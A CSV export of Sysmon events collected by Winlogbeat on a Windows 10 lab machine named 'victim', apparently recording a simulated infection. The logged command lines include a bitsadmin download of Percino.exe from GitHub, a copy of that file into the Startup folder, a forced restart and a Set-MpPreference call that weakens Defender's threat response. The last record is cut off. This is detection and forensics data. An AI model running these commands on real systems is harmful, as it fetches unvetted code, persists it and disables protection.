"Oct 23, 2022 @ 01:50:05.379",R0XTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.634",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_gtowedc5.jtx.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_gtowedc5.jtx.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_gtowedc5.jtx.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:50:05.379
ProcessGuid: {461f0bd2-2d48-6354-6600-000000001f00}
ProcessId: 5912
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_gtowedc5.jtx.ps1
CreationUtcTime: 2022-10-22 17:50:05.379
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2d48-6354-6600-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5912,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:50:05.379","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5113,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:50:01.013",RUXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.633",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_rxalb2w2.awg.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_rxalb2w2.awg.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_rxalb2w2.awg.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:50:01.013
ProcessGuid: {461f0bd2-2d48-6354-6600-000000001f00}
ProcessId: 5912
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_rxalb2w2.awg.ps1
CreationUtcTime: 2022-10-22 17:50:01.013
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2d48-6354-6600-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5912,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:50:01.013","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5111,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:50:00.269",QUXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.631",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:50:00.269
ProcessGuid: {461f0bd2-2d48-6354-6600-000000001f00}
ProcessId: 5912
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force""
CurrentDirectory: C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7
ParentProcessGuid: {461f0bd2-2d35-6354-5700-000000001f00}
ParentProcessId: 256
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd /c Percino.bat
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","powershell.exe, -command, Set-MpPreference -HighThreatDefaultAction 6 -Force",3,"powershell.exe  -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force""","powershell.exe  -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force""","{461f0bd2-2d48-6354-6600-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",04029e121a0cfa5991749937dd22a1d9,9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f,"powershell.exe","powershell.exe","cmd, /c, Percino.bat",3,"cmd /c Percino.bat","cmd /c Percino.bat","{461f0bd2-2d35-6354-5700-000000001f00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",256,"Microsoft Corporation","Windows PowerShell","10.0.19041.546 (WinBuild.160101.0800)",7c955a0abc747f57ccc4324480737ef7,"PowerShell.EXE","Microsoft® Windows® Operating System",5912,"-","-","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","-","-","-","-","-","-","9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f, 04029e121a0cfa5991749937dd22a1d9, 7c955a0abc747f57ccc4324480737ef7","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows PowerShell","-","10.0.19041.546 (WinBuild.160101.0800)",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5107,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:56.408",t0XQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.417",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:56.408
ProcessGuid: {461f0bd2-2d44-6354-c400-000000001e00}
ProcessId: 4968
Image: C:\Windows\System32\wlrmdr.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows logon reminder
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WLRMNDR.EXE
CommandLine: -s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3
CurrentDirectory: C:\Windows\system32\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2bde-6354-1787-040000000000}
LogonId: 0x48717
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EF9BBA7A637A11B224A90BF90A8943AC,SHA256=2FDA95AAFB2E9284C730BF912B93F60A75B151941ADC14445ED1E056140325B1,IMPHASH=0C029EF03BE0DFE4324558843609A28E
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 612
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","-s, -1, -f, 2, -t, You're, about, to, be, signed, out, -m, Windows, will, shut, down, in, less, than, a, minute., -a, 3",23,"-s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3","-s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3","{461f0bd2-2d44-6354-c400-000000001e00}","C:\Windows\System32\wlrmdr.exe","C:\Windows\System32\wlrmdr.exe",ef9bba7a637a11b224a90bf90a8943ac,2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1,"wlrmdr.exe","wlrmdr.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",612,"Microsoft Corporation","Windows logon reminder","10.0.19041.746 (WinBuild.160101.0800)",0c029ef03be0dfe4324558843609a28e,"WLRMNDR.EXE","Microsoft® Windows® Operating System",4968,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1, ef9bba7a637a11b224a90bf90a8943ac, 0c029ef03be0dfe4324558843609a28e","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows logon reminder","-","10.0.19041.746 (WinBuild.160101.0800)",High,"{461f0bd2-2bde-6354-1787-040000000000}",0x48717,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,276","2,512","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4929,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:56.307",tkXQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.416",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:56.307
ProcessGuid: {461f0bd2-2d44-6354-c300-000000001e00}
ProcessId: 6120
Image: C:\Windows\System32\shutdown.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Windows Shutdown and Annotation Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: SHUTDOWN.EXE
CommandLine: shutdown  -r
CurrentDirectory: C:\Supertools\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2bde-6354-1787-040000000000}
LogonId: 0x48717
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=F2A4E18DA72BB2C5B21076A5DE382A20,SHA256=D4E68CC9CB1965D70134C68BD1A090E0AFAE5B8B3D8018C6B6564852AE7BF396,IMPHASH=7381EF144DB2B1CFEA7EEF9BB9B7A530
ParentProcessGuid: {461f0bd2-2c77-6354-9e00-000000001e00}
ParentProcessId: 1992
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","shutdown, -r",2,"shutdown  -r","shutdown  -r","{461f0bd2-2d44-6354-c300-000000001e00}","C:\Windows\System32\shutdown.exe","C:\Windows\System32\shutdown.exe",f2a4e18da72bb2c5b21076a5de382a20,d4e68cc9cb1965d70134c68bd1a090e0afae5b8b3d8018c6b6564852ae7bf396,"shutdown.exe","shutdown.exe","C:\Windows\system32\cmd.exe, /c, C:\Users\Patricia, Goh\Desktop\Perci.bat ",4,"C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""","C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""","{461f0bd2-2c77-6354-9e00-000000001e00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",1992,"Microsoft Corporation","Windows Shutdown and Annotation Tool","10.0.19041.1 (WinBuild.160101.0800)",7381ef144db2b1cfea7eef9bb9b7a530,"SHUTDOWN.EXE","Microsoft® Windows® Operating System",6120,"-","-","C:\Supertools\","C:\Supertools\","-","-","-","-","-","-","d4e68cc9cb1965d70134c68bd1a090e0afae5b8b3d8018c6b6564852ae7bf396, f2a4e18da72bb2c5b21076a5de382a20, 7381ef144db2b1cfea7eef9bb9b7a530","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows Shutdown and Annotation Tool","-","10.0.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-2bde-6354-1787-040000000000}",0x48717,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,276","2,512","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4928,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:56.281",tUXQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.416",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",exe,"Percino.exe","C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe","C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: T1023
UtcTime: 2022-10-22 17:49:56.281
ProcessGuid: {461f0bd2-2c77-6354-9e00-000000001e00}
ProcessId: 1992
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe
CreationUtcTime: 2022-10-22 17:49:56.281
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2c77-6354-9e00-000000001e00}","C:\Windows\system32\cmd.exe","C:\Windows\system32\cmd.exe","-","-","cmd.exe","cmd.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",1992,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",T1023,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:49:56.281","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,276","2,512","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4927,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:49:54.981",s0XQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.414",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:54.981
ProcessGuid: {461f0bd2-2d42-6354-c200-000000001e00}
ProcessId: 4832
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Supertools\Percino.exe
CurrentDirectory: C:\Supertools\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2bde-6354-1787-040000000000}
LogonId: 0x48717
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {461f0bd2-2c77-6354-9e00-000000001e00}
ParentProcessId: 1992
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","bitsadmin, /transfer, Installation, /download, /priority, foreground, https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe, C:\Supertools\Percino.exe",8,"bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Supertools\Percino.exe","bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Supertools\Percino.exe","{461f0bd2-2d42-6354-c200-000000001e00}","C:\Windows\System32\bitsadmin.exe","C:\Windows\System32\bitsadmin.exe",01aab62d5799f75b0d69eb29c1ca6855,739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917,"bitsadmin.exe","bitsadmin.exe","C:\Windows\system32\cmd.exe, /c, C:\Users\Patricia, Goh\Desktop\Perci.bat ",4,"C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""","C:\Windows\system32\cmd.exe /c """"C:\Users\Patricia Goh\Desktop\Perci.bat"" ""","{461f0bd2-2c77-6354-9e00-000000001e00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",1992,"Microsoft Corporation","BITS administration utility","7.8.19041.1 (WinBuild.160101.0800)",774033454eb79213b09f788fc004a02d,"bitsadmin.exe","Microsoft® Windows® Operating System",4832,"-","-","C:\Supertools\","C:\Supertools\","-","-","-","-","-","-","739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917, 01aab62d5799f75b0d69eb29c1ca6855, 774033454eb79213b09f788fc004a02d","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","BITS administration utility","-","7.8.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-2bde-6354-1787-040000000000}",0x48717,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,276","2,512","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4925,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:54.753",P0XTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.631",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:54.753
ProcessGuid: {461f0bd2-2d42-6354-6400-000000001f00}
ProcessId: 5760
Image: C:\Program Files\winlogbeat\winlogbeat.exe
FileVersion: 8.2.3
Description: Winlogbeat ships Windows event logs to Elasticsearch or Logstash.
Product: Winlogbeat
Company: Elastic
OriginalFileName: winlogbeat.exe
CommandLine: ""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-2cdb-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=877E3C54A32856E349E3487DE69B963E,SHA256=C48B2B8A42E42B4C5D864389DB44CE0227821BEEBAF527C2E1947AD395D607D2,IMPHASH=FF9F3A86709796C17211F9DF12AAE74D
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 644
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Program Files\winlogbeat\winlogbeat.exe, --environment=windows_service, -c, C:\Program Files\winlogbeat\winlogbeat.yml, --path.home, C:\Program Files\winlogbeat, --path.data, C:\ProgramData\winlogbeat, --path.logs, C:\ProgramData\winlogbeat\logs, -E, logging.files.redirect_stderr=true",12,"""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true","""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true","{461f0bd2-2d42-6354-6400-000000001f00}","C:\Program Files\winlogbeat\winlogbeat.exe","C:\Program Files\winlogbeat\winlogbeat.exe",877e3c54a32856e349e3487de69b963e,c48b2b8a42e42b4c5d864389db44ce0227821beebaf527c2e1947ad395d607d2,"winlogbeat.exe","winlogbeat.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",644,Elastic,"Winlogbeat ships Windows event logs to Elasticsearch or Logstash.","8.2.3",ff9f3a86709796c17211f9df12aae74d,"winlogbeat.exe",Winlogbeat,5760,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","c48b2b8a42e42b4c5d864389db44ce0227821beebaf527c2e1947ad395d607d2, 877e3c54a32856e349e3487de69b963e, ff9f3a86709796c17211f9df12aae74d","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,Elastic,"-","Winlogbeat ships Windows event logs to Elasticsearch or Logstash.","-","8.2.3",System,"{461f0bd2-2cdb-6354-e703-000000000000}",0x3e7,"-","-","-",Winlogbeat,"-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5105,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:53.808",PkXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.630",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
